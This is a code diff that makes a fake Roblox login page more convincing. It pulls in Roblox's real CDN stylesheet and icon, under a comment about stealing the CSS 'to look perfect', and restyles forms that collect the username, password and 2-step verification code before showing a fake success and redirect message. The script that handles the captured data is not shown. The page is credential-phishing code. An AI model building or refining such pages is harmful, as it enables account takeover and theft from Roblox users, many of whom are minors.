@@ -1,41 +1,55 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Roblox - Log In</title>
-    <!-- Basic styling to mimic Roblox -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox</title>
+    <!-- Steal the real Roblox CSS to look perfect -->
+    <link rel="stylesheet" href="https://css.rbxcdn.com/e712ca41cb057bb3437b163827c3c781440d8e620a807aa2b3e4887da9864da7.css">
+    <link rel="icon" href="https://images.rbxcdn.com/e854eb7b2951ac03edba9a2681032bba.ico">
     <style>
-        body { font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .login-box { background-color: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 360px; text-align: center; }
-        input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 6px; }
-        button { width: 100%; padding: 12px; background-color: #00a2ff; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; }
-        .hidden { display: none; }
-        #errorMessage { color: red; margin-bottom: 10px; }
+        body { display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .hidden { display: none !important; }
     </style>
 </head>
-<body>
-    <div class="login-box">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/7/73/Roblox_logo.svg" alt="Roblox Logo" width="150">
-        
-        <!-- Login Form -->
-        <div id="loginDiv">
-            <p>Log in to Roblox</p>
-            <div id="loginError" class="hidden" style="color:red;">Incorrect username or password. Please try again.</div>
-            <input type="text" id="username" placeholder="Username/Email/Phone">
-            <input type="password" id="password" placeholder="Password">
-            <button onclick="submitLogin()">Log In</button>
-        </div>
+<body class="light-theme">
+    <div id="login-page-container">
+        <div class="login-container" style="max-width: 380px;">
+            <div class="login-form-container">
+                <div class="login-form">
+                    <div class="login-header">
+                        <h2>Log in to Roblox</h2>
+                    </div>
 
-        <!-- 2FA Form -->
-        <div id="tfaDiv" class="hidden">
-            <p>2-Step Verification</p>
-            <p>Enter the code from your authenticator app.</p>
-            <input type="text" id="tfaCode" placeholder="6-Digit Code">
-            <button onclick="submitTfa()">Verify</button>
-        </div>
+                    <!-- Login Form -->
+                    <div id="loginDiv">
+                        <div id="loginError" class="hidden message-error" style="margin-bottom: 10px;">Incorrect username or password. Please try again.</div>
+                        <div class="form-group">
+                            <input id="username" type="text" class="form-control" placeholder="Username/Email/Phone">
+                        </div>
+                        <div class="form-group">
+                            <input id="password" type="password" class="form-control" placeholder="Password">
+                        </div>
+                        <button class="btn-primary-lg btn-full-width" onclick="submitLogin()">Log In</button>
+                    </div>
 
-        <!-- Success/Redirect Message -->
-        <div id="successDiv" class="hidden">
-            <p>Success! Redirecting you to the forum...</p>
+                    <!-- 2FA Form -->
+                    <div id="tfaDiv" class="hidden">
+                        <h3>2-Step Verification</h3>
+                        <p style="margin-top: 10px; margin-bottom: 10px;">Enter the code from your authenticator app.</p>
+                        <div class="form-group">
+                            <input id="tfaCode" type="text" class="form-control" placeholder="6-Digit Code">
+                        </div>
+                        <button class="btn-primary-lg btn-full-width" onclick="submitTfa()">Verify</button>
+                    </div>
+
+                    <!-- Success Message -->
+                    <div id="successDiv" class="hidden">
+                        <h3>Success!</h3>
+                        <p>Redirecting you now...</p>
+                    </div>
+                </div>
+            </div>
         </div>
     </div>
     <script src="app.js"></script>
